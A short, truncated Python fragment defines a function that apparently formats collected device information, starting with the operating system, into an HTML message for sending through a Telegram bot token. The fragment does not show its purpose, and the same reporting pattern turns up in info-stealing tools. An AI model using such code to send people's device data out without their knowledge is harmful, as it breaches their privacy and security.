...
def tgram_sender(msg_type, content, token):
    ...
    if msg_type == 'device_info':
        info_message = f"""<b>Device Information</b>

<pre>OS         : {json_content['os']}
